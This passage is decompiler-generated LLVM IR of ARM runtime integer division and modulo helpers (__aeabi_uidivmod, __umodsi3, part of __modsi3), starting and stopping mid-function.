dec_label_pc_14148:                               ; preds = %bb80
  %v0_14148 = load i32, i32* @lr, align 4
  %v0_1414c = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_14148)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1413c, { 1, 0 }
  uselistorder i1 %v7_14134, { 1, 0 }
  uselistorder i32 %v4_1412c, { 1, 0 }
  uselistorder i32 %v1_1412c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14120, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_14120, { 1, 0, 2, 3 }
  uselistorder i32 %v4_14110, { 1, 0 }
  uselistorder i32 %v0_140e8, { 1, 0 }
  uselistorder i32 %v4_140dc, { 1, 0 }
  uselistorder i32 %v1_140e4, { 1, 2, 0 }
  uselistorder i32 %v4_140d0, { 1, 0 }
  uselistorder i32 %v1_140d8, { 1, 2, 0 }
  uselistorder i32 %v4_140c4, { 1, 0 }
  uselistorder i32 %v1_140cc, { 1, 2, 0 }
  uselistorder i32 %v1_140f0, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_140c0, { 1, 0 }
  uselistorder i32 %v1_140ec, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_140ac, { 1, 0 }
  uselistorder i32 %v3_140a8, { 1, 0 }
  uselistorder i32 %v1_140a8, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_140ac, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14098, { 1, 0 }
  uselistorder i32 %v4_14094, { 2, 1, 0 }
  uselistorder i32 %v1_14098, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_140a0.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v0_1406c, { 2, 5, 3, 1, 4, 0 }
  uselistorder i1 true, { 0, 1, 42, 2, 3, 4, 5, 6, 10, 11, 12, 69, 70, 71, 72, 61, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 13, 14, 89, 90, 91, 43, 60, 8, 9, 59, 7, 92, 16, 15, 48, 54, 49, 55, 46, 53, 47, 58, 93, 17, 94, 95, 18, 19, 20, 96, 62, 63, 21, 22, 97, 64, 65, 23, 24, 98, 66, 67, 25, 26, 45, 99, 100, 56, 101, 27, 50, 28, 29, 44, 30, 31, 32, 102, 103, 104, 105, 51, 106, 107, 108, 109, 110, 111, 112, 113, 37, 114, 38, 39, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 36, 129, 130, 131, 132, 133, 134, 35, 135, 41, 136, 52, 57, 40, 137, 33, 34, 68, 138 }
  uselistorder i32 15, { 11, 12, 2, 0, 20, 3, 4, 5, 6, 7, 8, 9, 13, 14, 10, 15, 16, 17, 18, 1, 19 }
  uselistorder i32 256, { 0, 1, 2, 5, 6, 7, 3, 4, 8, 11, 12, 13, 9, 10, 14, 15, 16, 17, 18, 408, 409, 19, 20, 21, 22, 23, 24, 25, 410, 26, 27, 29, 28, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 42, 40, 41, 45, 44, 43, 46, 404, 411, 51, 47, 50, 48, 49, 401, 52, 53, 54, 55, 405, 56, 57, 58, 59, 60, 406, 61, 62, 63, 64, 65, 66, 67, 68, 70, 69, 71, 72, 73, 74, 75, 76, 77, 79, 80, 78, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 98, 97, 99, 100, 101, 105, 111, 106, 102, 107, 112, 108, 113, 109, 103, 114, 104, 115, 116, 110, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 129, 130, 128, 131, 134, 135, 133, 132, 136, 139, 138, 137, 146, 143, 140, 141, 147, 144, 148, 145, 149, 142, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 167, 166, 168, 169, 170, 181, 176, 171, 182, 177, 178, 183, 179, 172, 173, 174, 184, 185, 186, 187, 180, 175, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 201, 200, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 214, 213, 222, 218, 215, 219, 223, 220, 224, 221, 216, 217, 225, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 240, 243, 242, 241, 249, 244, 255, 256, 250, 245, 257, 258, 251, 246, 259, 252, 253, 260, 254, 261, 247, 262, 248, 263, 264, 265, 266, 267, 268, 269, 272, 273, 276, 274, 270, 277, 275, 271, 280, 279, 278, 283, 284, 281, 285, 282, 286, 293, 289, 294, 292, 287, 290, 288, 291, 295, 402, 407, 296, 297, 298, 299, 303, 300, 301, 302, 305, 306, 304, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 322, 321, 323, 324, 325, 327, 326, 328, 329, 330, 331, 334, 341, 335, 336, 332, 337, 338, 339, 333, 342, 340, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 356, 355, 357, 358, 359, 363, 370, 364, 365, 371, 366, 360, 361, 367, 362, 368, 372, 369, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 386, 385, 387, 388, 389, 390, 392, 391, 393, 394, 395, 396, 397, 400, 403, 412, 398, 399 }
  uselistorder i32 128, { 14, 15, 16, 27, 2, 28, 17, 18, 19, 20, 24, 3, 22, 4, 23, 5, 12, 13, 25, 26, 7, 0, 1, 8, 9, 10, 29, 6, 30, 21, 11 }
  uselistorder i32 255, { 14, 16, 2, 18, 3, 19, 4, 20, 0, 1, 7, 21, 8, 22, 5, 23, 6, 24, 11, 25, 12, 26, 9, 27, 10, 28, 15, 17, 13, 29 }
  uselistorder i32 65536, { 6, 7, 8, 9, 10, 11, 12, 13, 15, 14, 17, 16, 18, 20, 19, 21, 1, 22, 0, 2, 23, 24, 25, 26, 27, 30, 28, 29, 31, 32, 33, 38, 39, 40, 41, 34, 35, 36, 37, 42, 45, 46, 47, 43, 44, 48, 49, 50, 51, 52, 53, 54, 56, 55, 57, 3, 58, 60, 61, 59, 62, 63, 66, 67, 68, 64, 65, 69, 70, 71, 72, 73, 74, 100, 76, 75, 101, 77, 78, 80, 79, 82, 81, 83, 4, 84, 87, 88, 89, 85, 86, 90, 5, 91, 95, 96, 97, 92, 93, 94, 99, 98 }
  uselistorder i32 32768, { 1, 0 }
  uselistorder i32 65535, { 91, 47, 0, 1, 11, 48, 24, 49, 23, 50, 22, 51, 12, 13, 2, 26, 52, 25, 53, 54, 14, 55, 3, 29, 56, 27, 57, 28, 58, 59, 4, 30, 60, 61, 15, 62, 5, 34, 63, 33, 64, 31, 65, 32, 66, 67, 16, 68, 6, 69, 70, 38, 71, 37, 72, 36, 73, 35, 74, 17, 18, 7, 75, 39, 76, 40, 77, 78, 79, 19, 80, 81, 8, 43, 82, 42, 83, 41, 84, 85, 20, 86, 9, 10, 46, 87, 44, 88, 45, 89, 21, 90 }
  uselistorder i32 %arg2, { 8, 12, 7, 6, 5, 10, 11, 0, 9, 1, 4, 2, 3 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb98, { 1, 0 }
  uselistorder label %dec_label_pc_140f8, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_140b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_140a0thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1415c = udiv i32 %arg1, %arg2
  ret i32 %v2_1415c
}

define i32 @__umodsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_14170 = add i32 %arg2, -1
  %v2_14170 = icmp eq i32 %arg2, 0
  br i1 %v2_14170, label %dec_label_pc_1422c, label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %entry
  %v7_14170 = icmp eq i32 %arg2, 1
  br i1 %v7_14170, label %.thread65, label %bb

bb:                                               ; preds = %dec_label_pc_14178
  %v1_14178 = load i32, i32* @r0, align 4
  %v10_14178 = icmp eq i32 %v1_14178, %arg2
  br i1 %v10_14178, label %.thread65, label %bb74

.thread65:                                        ; preds = %dec_label_pc_14178, %bb
  br label %.thread67

bb74:                                             ; preds = %bb
  %v4_14178 = icmp ult i32 %v1_14178, %arg2
  br i1 %v4_14178, label %bb76, label %bb75

bb75:                                             ; preds = %bb74
  %v6_14180 = and i32 %v1_14170, %arg2
  %v8_14180 = icmp eq i32 %v6_14180, 0
  br i1 %v8_14180, label %.thread67, label %dec_label_pc_14190.preheader

.thread67:                                        ; preds = %bb75, %.thread65
  %v1_14184 = phi i32 [ %v1_14178, %bb75 ], [ 0, %.thread65 ]
  %v3_14184 = and i32 %v1_14184, %v1_14170
  br label %bb76

dec_label_pc_14190.preheader:                     ; preds = %bb75
  %v2_1419099 = icmp ugt i32 %arg2, 268435455
  br i1 %v2_1419099, label %.thread, label %bb77

bb76:                                             ; preds = %dec_label_pc_14220, %bb74, %bb89, %bb84, %dec_label_pc_141f0, %.thread67
  %v5_14188 = phi i32 [ %v1_14178, %bb74 ], [ %v3_14184, %.thread67 ], [ %v1_141cc.v6_141cc.v6_141d4.v6_141dc, %dec_label_pc_141f0 ], [ 0, %bb84 ], [ %v1_14224, %dec_label_pc_14220 ], [ %v2_14220, %bb89 ]
  ret i32 %v5_14188

.thread:                                          ; preds = %.thread1.thread9, %dec_label_pc_14190.preheader
  %v0_141a4.pr33.lcssa = phi i32 [ %arg2, %dec_label_pc_14190.preheader ], [ %v4_14198, %.thread1.thread9 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_14190.preheader ], [ %v2_1419c11, %.thread1.thread9 ]
  br label %dec_label_pc_141a4thread-pre-split.loopexit

bb77:                                             ; preds = %dec_label_pc_14190.preheader, %.thread1.thread9
  %storemerge101 = phi i32 [ %v2_1419c11, %.thread1.thread9 ], [ 0, %dec_label_pc_14190.preheader ]
  %v0_141a4.pr33100 = phi i32 [ %v4_14198, %.thread1.thread9 ], [ %arg2, %dec_label_pc_14190.preheader ]
  %v4_14194 = icmp ult i32 %v0_141a4.pr33100, %v1_14178
  br i1 %v4_14194, label %bb78, label %dec_label_pc_141a4thread-pre-split.loopexit.loopexit

bb78:                                             ; preds = %bb77
  %v2_14198 = and i32 %v0_141a4.pr33100, 268435456
  %v3_14198 = icmp eq i32 %v2_14198, 0
  %v4_14198 = mul i32 %v0_141a4.pr33100, 16
  br i1 %v3_14198, label %.thread1.thread9, label %dec_label_pc_141a4.loopexit

.thread1.thread9:                                 ; preds = %bb78
  %v2_1419c11 = add i32 %storemerge101, 4
  %v2_14190 = icmp ugt i32 %v4_14198, 268435455
  br i1 %v2_14190, label %.thread, label %bb77

dec_label_pc_141a4thread-pre-split.loopexit.loopexit: ; preds = %bb77
  br label %dec_label_pc_141a4thread-pre-split.loopexit

dec_label_pc_141a4thread-pre-split.loopexit:      ; preds = %dec_label_pc_141a4thread-pre-split.loopexit.loopexit, %.thread
  %v0_141a4.pr3398 = phi i32 [ %v0_141a4.pr33.lcssa, %.thread ], [ %v0_141a4.pr33100, %dec_label_pc_141a4thread-pre-split.loopexit.loopexit ]
  %storemerge95 = phi i32 [ %storemerge.lcssa, %.thread ], [ %storemerge101, %dec_label_pc_141a4thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_141a4thread-pre-split

dec_label_pc_141a4thread-pre-split:               ; preds = %.thread4, %dec_label_pc_141a4thread-pre-split.loopexit
  %v1_141b039 = phi i32 [ %storemerge95, %dec_label_pc_141a4thread-pre-split.loopexit ], [ %v2_141b0, %.thread4 ]
  %v0_141a4.pr = phi i32 [ %v0_141a4.pr3398, %dec_label_pc_141a4thread-pre-split.loopexit ], [ %v3_141ac, %.thread4 ]
  br label %dec_label_pc_141a4

dec_label_pc_141a4.loopexit:                      ; preds = %bb78
  br label %dec_label_pc_141a4

dec_label_pc_141a4:                               ; preds = %dec_label_pc_141a4.loopexit, %dec_label_pc_141a4thread-pre-split
  %v0_141b8.pr = phi i32 [ %v1_141b039, %dec_label_pc_141a4thread-pre-split ], [ %storemerge101, %dec_label_pc_141a4.loopexit ]
  %v1_141ac = phi i32 [ %v0_141a4.pr, %dec_label_pc_141a4thread-pre-split ], [ %v4_14198, %dec_label_pc_141a4.loopexit ]
  %v2_141a4 = icmp slt i32 %v1_141ac, 0
  br i1 %v2_141a4, label %dec_label_pc_141b8, label %bb79

bb79:                                             ; preds = %dec_label_pc_141a4
  %v4_141a8 = icmp ult i32 %v1_141ac, %v1_14178
  br i1 %v4_141a8, label %.thread4, label %dec_label_pc_141b8

.thread4:                                         ; preds = %bb79
  %v3_141ac = mul i32 %v1_141ac, 2
  %v2_141b0 = add i32 %v0_141b8.pr, 1
  br label %dec_label_pc_141a4thread-pre-split

dec_label_pc_141b8:                               ; preds = %bb79, %dec_label_pc_141a4
  %v2_141b8 = add i32 %v0_141b8.pr, -3
  %v5_141bc = icmp slt i32 %v0_141b8.pr, 3
  br i1 %v5_141bc, label %dec_label_pc_141fc, label %dec_label_pc_141c0

dec_label_pc_141c0:                               ; preds = %dec_label_pc_141b8, %bb83
  %v6_141e8 = phi i32 [ %v0_141f0, %bb83 ], [ %v2_141b8, %dec_label_pc_141b8 ]
  %v1_141c4 = phi i32 [ %v1_141cc.v6_141cc.v6_141d4.v6_141dc, %bb83 ], [ %v1_14178, %dec_label_pc_141b8 ]
  %v3_141e412 = phi i32 [ %v3_141e4, %bb83 ], [ %v1_141ac, %dec_label_pc_141b8 ]
  %v3_141c0 = icmp ult i32 %v1_141c4, %v3_141e412
  %v3_141c4 = select i1 %v3_141c0, i32 0, i32 %v3_141e412
  %v1_141cc = sub i32 %v1_141c4, %v3_141c4
  %v4_141c8 = udiv i32 %v3_141e412, 2
  %v6_141c8 = icmp ult i32 %v1_141cc, %v4_141c8
  %v6_141cc = select i1 %v6_141c8, i32 0, i32 %v4_141c8
  %v1_141cc.v6_141cc = sub i32 %v1_141cc, %v6_141cc
  %.demorgan = and i1 %v3_141c0, %v6_141c8
  %v4_141d0 = udiv i32 %v3_141e412, 4
  %v6_141d0 = icmp ult i32 %v1_141cc.v6_141cc, %v4_141d0
  %v6_141d4 = select i1 %v6_141d0, i32 0, i32 %v4_141d0
  %v1_141cc.v6_141cc.v6_141d4 = sub i32 %v1_141cc.v6_141cc, %v6_141d4
  %.demorgan71 = and i1 %.demorgan, %v6_141d0
  %v4_141d8 = udiv i32 %v3_141e412, 8
  %v6_141d8 = icmp ult i32 %v1_141cc.v6_141cc.v6_141d4, %v4_141d8
  %v6_141dc = select i1 %v6_141d8, i32 0, i32 %v4_141d8
  %v1_141cc.v6_141cc.v6_141d4.v6_141dc = sub i32 %v1_141cc.v6_141cc.v6_141d4, %v6_141dc
  %.demorgan72 = and i1 %.demorgan71, %v6_141d8
  br i1 %.demorgan72, label %bb81, label %bb80

bb80:                                             ; preds = %dec_label_pc_141c0
  br label %bb81

bb81:                                             ; preds = %dec_label_pc_141c0, %bb80
  %v2_141e0 = add i32 %v1_141cc.v6_141cc.v6_141d4.v6_141dc, -1
  %v4_141e0 = sub i32 0, %v1_141cc.v6_141cc.v6_141d4.v6_141dc
  %v5_141e0 = and i32 %v1_141cc.v6_141cc.v6_141d4.v6_141dc, %v4_141e0
  %v3_141e4 = udiv i32 %v3_141e412, 16
  %v5_141e8 = icmp slt i32 %v1_141cc.v6_141cc.v6_141d4.v6_141dc, 1
  br i1 %v5_141e8, label %bb83, label %bb82

bb82:                                             ; preds = %bb81
  %v7_141e8 = add i32 %v6_141e8, -4
  %v9_141e8 = sub i32 3, %v6_141e8
  %v10_141e8 = and i32 %v9_141e8, %v6_141e8
  br label %bb83

bb83:                                             ; preds = %bb81, %bb82
  %v0_141f0 = phi i32 [ %v6_141e8, %bb81 ], [ %v7_141e8, %bb82 ]
  %v0_141ec15.in = phi i32 [ %v2_141e0, %bb81 ], [ %v7_141e8, %bb82 ]
  %v1_141ec14.in = phi i32 [ %v5_141e0, %bb81 ], [ %v10_141e8, %bb82 ]
  %v1_141ec14 = icmp slt i32 %v1_141ec14.in, 0
  %v0_141ec15 = icmp slt i32 %v0_141ec15.in, 0
  %v2_141ec = xor i1 %v0_141ec15, %v1_141ec14
  br i1 %v2_141ec, label %dec_label_pc_141f0, label %dec_label_pc_141c0

dec_label_pc_141f0:                               ; preds = %bb83
  %v1_141f0 = urem i32 %v0_141f0, 4
  %v2_141f0 = icmp eq i32 %v1_141f0, 0
  br i1 %v2_141f0, label %bb76, label %bb84

bb84:                                             ; preds = %dec_label_pc_141f0
  %v3_141f4 = icmp eq i32 %v1_141cc.v6_141cc.v6_141d4.v6_141dc, 0
  br i1 %v3_141f4, label %bb76, label %dec_label_pc_141fc

dec_label_pc_141fc:                               ; preds = %bb84, %dec_label_pc_141b8
  %v0_14210 = phi i32 [ %v3_141e4, %bb84 ], [ %v1_141ac, %dec_label_pc_141b8 ]
  %v1_1420c = phi i32 [ %v1_141cc.v6_141cc.v6_141d4.v6_141dc, %bb84 ], [ %v1_14178, %dec_label_pc_141b8 ]
  %v0_141fc = phi i32 [ %v0_141f0, %bb84 ], [ %v2_141b8, %dec_label_pc_141b8 ]
  %v5_14200 = icmp slt i32 %v0_141fc, -2
  br i1 %v5_14200, label %dec_label_pc_14220, label %dec_label_pc_14204

dec_label_pc_14204:                               ; preds = %dec_label_pc_141fc
  %v8_141fc = icmp eq i32 %v0_141fc, -2
  br i1 %v8_141fc, label %dec_label_pc_14214, label %dec_label_pc_14208

dec_label_pc_14208:                               ; preds = %dec_label_pc_14204
  %v3_14208 = icmp ult i32 %v1_1420c, %v0_14210
  br i1 %v3_14208, label %bb86, label %bb85

bb85:                                             ; preds = %dec_label_pc_14208
  %v2_14208 = sub i32 %v1_1420c, %v0_14210
  br label %bb86

bb86:                                             ; preds = %dec_label_pc_14208, %bb85
  %v0_1421452 = phi i32 [ %v1_1420c, %dec_label_pc_14208 ], [ %v2_14208, %bb85 ]
  %v3_14210 = udiv i32 %v0_14210, 2
  br label %dec_label_pc_14214

dec_label_pc_14214:                               ; preds = %dec_label_pc_14204, %bb86
  %v0_1421c = phi i32 [ %v0_14210, %dec_label_pc_14204 ], [ %v3_14210, %bb86 ]
  %v1_14218 = phi i32 [ %v1_1420c, %dec_label_pc_14204 ], [ %v0_1421452, %bb86 ]
  %v3_14214 = icmp ult i32 %v1_14218, %v0_1421c
  br i1 %v3_14214, label %bb88, label %bb87

bb87:                                             ; preds = %dec_label_pc_14214
  %v2_14214 = sub i32 %v1_14218, %v0_1421c
  br label %bb88

bb88:                                             ; preds = %dec_label_pc_14214, %bb87
  %v0_1422055 = phi i32 [ %v1_14218, %dec_label_pc_14214 ], [ %v2_14214, %bb87 ]
  %v3_1421c = udiv i32 %v0_1421c, 2
  br label %dec_label_pc_14220

dec_label_pc_14220:                               ; preds = %dec_label_pc_141fc, %bb88
  %v2_14224 = phi i32 [ %v0_14210, %dec_label_pc_141fc ], [ %v3_1421c, %bb88 ]
  %v1_14224 = phi i32 [ %v1_1420c, %dec_label_pc_141fc ], [ %v0_1422055, %bb88 ]
  %v3_14220 = icmp ult i32 %v1_14224, %v2_14224
  br i1 %v3_14220, label %bb76, label %bb89

bb89:                                             ; preds = %dec_label_pc_14220
  %v2_14220 = sub i32 %v1_14224, %v2_14224
  br label %bb76

dec_label_pc_1422c:                               ; preds = %entry
  %v0_1422c = load i32, i32* @lr, align 4
  %v0_14230 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_1422c)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_14224, { 1, 2, 0 }
  uselistorder i32 %v0_14210, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_141f0, { 1, 0, 2 }
  uselistorder i32 %v7_141e8, { 1, 0 }
  uselistorder i32 %v3_141e4, { 1, 0 }
  uselistorder i32 %v1_141cc.v6_141cc.v6_141d4.v6_141dc, { 1, 2, 7, 5, 6, 4, 0, 3 }
  uselistorder i32 %v4_141d8, { 1, 0 }
  uselistorder i32 %v4_141d0, { 1, 0 }
  uselistorder i32 %v4_141c8, { 1, 0 }
  uselistorder i32 %v6_141e8, { 3, 0, 2, 1 }
  uselistorder i32 %v2_141b8, { 1, 0 }
  uselistorder i32 %v1_141ac, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_14198, { 1, 0, 3, 2 }
  uselistorder i32 %v0_141a4.pr33100, { 1, 0, 2, 3 }
  uselistorder i32 %v1_14178, { 4, 1, 5, 3, 0, 2, 6, 7 }
  uselistorder i32 %arg2, { 7, 8, 6, 5, 3, 4, 0, 2, 1 }
  uselistorder label %dec_label_pc_14220, { 1, 0 }
  uselistorder label %bb88, { 1, 0 }
  uselistorder label %dec_label_pc_14214, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %bb83, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %dec_label_pc_141c0, { 1, 0 }
  uselistorder label %bb77, { 1, 0 }
  uselistorder label %bb76, { 2, 0, 3, 4, 5, 1 }
  uselistorder label %.thread65, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_1423c = icmp eq i32 %arg2, 0
  br i1 %v2_1423c, label %dec_label_pc_14310, label %dec_label_pc_14244

dec_label_pc_14244:                               ; preds = %entry
  %v1_1423c = icmp slt i32 %arg2, 0
  br i1 %v1_1423c, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_14244
  %v2_14244 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_14244, %bb
  %v4_1425c = phi i32 [ %arg2, %dec_label_pc_14244 ], [ %v2_14244, %bb ]
  %v0_14248 = load i32, i32* @r0, align 4
  %v1_14248 = icmp slt i32 %v0_14248, 0
  br i1 %v1_14248, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_1424c = sub i32 0, %v0_14248
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_14254 = phi i32 [ %v0_14248, %bb79 ], [ %v2_1424c, %bb80 ]
  %v1_14250 = add i32 %v4_1425c, -1
  %v7_14250 = icmp eq i32 %v4_1425c, 1
  br i1 %v7_14250, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_14254 = icmp eq i32 %v1_14254, %v4_1425c
  br i1 %v10_14254, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_14254 = icmp ult i32 %v1_14254, %v4_1425c
  br i1 %v4_14254, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_1425c = and i32 %v1_14250, %v4_1425c
  %v8_1425c = icmp eq i32 %v6_1425c, 0
  br i1 %v8_1425c, label %.thread72, label %dec_label_pc_1426c.preheader

dec_label_pc_1426c.preheader:                     ; preds = %bb84
  %v2_1426c109 = icmp ugt i32 %v4_1425c, 268435455
  br i1 %v2_1426c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_1426064 = phi i32 [ %v1_14254, %bb84 ], [ 0, %.thread70 ]
  %v3_14260 = and i32 %v1_1426064, %v1_14250
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_1426c.preheader
  %v0_14280.pr35.lcssa = phi i32 [ %v4_1425c, %dec_label_pc_1426c.preheader ], [ %v4_14274, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_1426c.preheader ], [ %v2_142789, %.thread2.thread7 ]
  br label %dec_label_pc_14280thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_1426c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_142789, %.thread2.thread7 ], [ 0, %dec_label_pc_1426c.preheader ]
  %v0_14280.pr35110 = phi i32 [ %v4_14274, %.thread2.thread7 ], [ %v4_1425c, %dec_label_pc_1426c.preheader ]
  %v4_14270 = icmp ult i32 %v0_14280.pr35110, %v1_14254
  br i1 %v4_14270, label %bb86, label %dec_label_pc_14280thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_14274 = and i32 %v0_14280.pr35110, 268435456
  %v3_14274 = icmp eq i32 %v2_14274, 0
  %v4_14274 = mul i32 %v0_14280.pr35110, 16
  br i1 %v3_14274, label %.thread2.thread7, label %dec_label_pc_14280.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_142789 = add i32 %storemerge111, 4
  %v2_1426c = icmp ugt i32 %v4_14274, 268435455
  br i1 %v2_1426c, label %.thread1, label %bb85

dec_label_pc_14280thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_14280thread-pre-split.loopexit

dec_label_pc_14280thread-pre-split.loopexit:      ; preds = %dec_label_pc_14280thread-pre-split.loopexit.loopexit, %.thread1
  %v0_14280.pr35108 = phi i32 [ %v0_14280.pr35.lcssa, %.thread1 ], [ %v0_14280.pr35110, %dec_label_pc_14280thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_14280thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_14280thread-pre-split

dec_label_pc_14280thread-pre-split:               ; preds = %.thread4, %dec_label_pc_14280thread-pre-split.loopexit
  %v1_1428c41 = phi i32 [ %storemerge105, %dec_label_pc_14280thread-pre-split.loopexit ], [ %v2_1428c, %.thread4 ]
  %v2_1428436 = phi i32 [ %v1_14254, %dec_label_pc_14280thread-pre-split.loopexit ], [ %v2_14284, %.thread4 ]
  %v0_14280.pr = phi i32 [ %v0_14280.pr35108, %dec_label_pc_14280thread-pre-split.loopexit ], [ %v3_14288, %.thread4 ]
  br label %dec_label_pc_14280

dec_label_pc_14280.loopexit:                      ; preds = %bb86
  br label %dec_label_pc_14280

dec_label_pc_14280:                               ; preds = %dec_label_pc_14280.loopexit, %dec_label_pc_14280thread-pre-split
  %v0_14294.pr = phi i32 [ %v1_1428c41, %dec_label_pc_14280thread-pre-split ], [ %storemerge111, %dec_label_pc_14280.loopexit ]
  %v2_14284 = phi i32 [ %v2_1428436, %dec_label_pc_14280thread-pre-split ], [ %v1_14254, %dec_label_pc_14280.loopexit ]
  %v1_14288 = phi i32 [ %v0_14280.pr, %dec_label_pc_14280thread-pre-split ], [ %v4_14274, %dec_label_pc_14280.loopexit ]
  %v2_14280 = icmp slt i32 %v1_14288, 0
  br i1 %v2_14280, label %dec_label_pc_14294, label %bb87

bb87:                                             ; preds = %dec_label_pc_14280
  %v4_14284 = icmp ult i32 %v1_14288, %v2_14284
  br i1 %v4_14284, label %.thread4, label %dec_label_pc_14294

.thread4:                                         ; preds = %bb87
  %v3_14288 = mul i32 %v1_14288, 2
  %v2_1428c = add i32 %v0_14294.pr, 1
  br label %dec_label_pc_14280thread-pre-split

dec_label_pc_14294:                               ; preds = %bb87, %dec_label_pc_14280
  %v2_14294 = add i32 %v0_14294.pr, -3
  %v5_14298 = icmp slt i32 %v0_14294.pr, 3
  br i1 %v5_14298, label %dec_label_pc_142d8, label %dec_label_pc_1429c

dec_label_pc_1429c:                               ; preds = %dec_label_pc_14294, %bb91
  %v6_142c4 = phi i32 [ %v0_142cc, %bb91 ], [ %v2_14294, %dec_label_pc_14294 ]
  %v1_142a0 = phi i32 [ %v1_142a8.v6_142a8.v6_142b0.v6_142b8, %bb91 ], [ %v2_14284, %dec_label_pc_14294 ]
  %v3_142c010 = phi i32 [ %v3_142c0, %bb91 ], [ %v1_14288, %dec_label_pc_14294 ]
  %v3_1429c = icmp ult i32 %v1_142a0, %v3_142c010
  %v3_142a0 = select i1 %v3_1429c, i32 0, i32 %v3_142c010
  %v1_142a8 = sub i32 %v1_142a0, %v3_142a0
  %v4_142a4 = udiv i32 %v3_142c010, 2
  %v6_142a4 = icmp ult i32 %v1_142a8, %v4_142a4
  %v6_142a8 = select i1 %v6_142a4, i32 0, i32 %v4_142a4
  %v1_142a8.v6_142a8 = sub i32 %v1_142a8, %v6_142a8
  %.demorgan = and i1 %v3_1429c, %v6_142a4
  %v4_142ac = udiv i32 %v3_142c010, 4
  %v6_142ac = icmp ult i32 %v1_142a8.v6_142a8, %v4_142ac
  %v6_142b0 = select i1 %v6_142ac, i32 0, i32 %v4_142ac
  %v1_142a8.v6_142a8.v6_142b0 = sub i32 %v1_142a8.v6_142a8, %v6_142b0
  %.demorgan76 = and i1 %.demorgan, %v6_142ac
  %v4_142b4 = udiv i32 %v3_142c010, 8
  %v6_142b4 = icmp ult i32 %v1_142a8.v6_142a8.v6_142b0, %v4_142b4
  %v6_142b8 = select i1 %v6_142b4, i32 0, i32 %v4_142b4
  %v1_142a8.v6_142a8.v6_142b0.v6_142b8 = sub i32 %v1_142a8.v6_142a8.v6_142b0, %v6_142b8
  %.demorgan77 = and i1 %.demorgan76, %v6_142b4
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_1429c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_1429c, %bb88
  %v2_142bc = add i32 %v1_142a8.v6_142a8.v6_142b0.v6_142b8, -1
